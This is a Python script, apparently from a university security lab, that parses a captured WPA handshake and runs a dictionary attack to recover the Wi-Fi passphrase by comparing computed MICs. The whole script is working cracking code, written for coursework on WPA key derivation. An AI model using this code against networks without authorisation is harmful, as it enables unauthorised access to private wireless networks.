#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein"
__modified__    = "Nair Alic et Adam Zouari"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]


# Open the dictionary file and read every line and put it into a list
_file = open("./dico.txt", "r")
dico = list()

for line in _file:
    dico.append(line[:-1])

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = wpa[3].info # we get the SSID from the Association Request frame
APmac       = a2b_hex(wpa[3].addr1.replace(":", "")) # Same here but with the destination mac
Clientmac   = a2b_hex(wpa[3].addr2.replace(":", "")) # Same here but with the source mac

# Authenticator and Supplicant Nonces
ANonce      = wpa[5].load[13:45]  # we get the Authenticator nonce from first 4-way handshake frame
SNonce      = wpa[6].load[13:45]  # we get the Supplicant nonce from second 4-way handshake frame

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
mic_to_test = wpa[8].load.encode("hex")[154:186] # we get the MIC from 4th 4-way handshake frame

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000") #cf "Quelques détails importants" dans la donnée

for passphrase in dico:

    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    pmk = pbkdf2_hex(passphrase, ssid, 4096, 32)
    
    #expand pmk to obtain PTK
    ptk = customPRF512(a2b_hex(pmk),A,B)
    
    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
    
    # remove the ICV [:-8] and check if it's the same if yes print the passphrase 
    if mic.hexdigest()[:-8] == mic_to_test:
        print "The passphrase is : ", passphrase 
        break


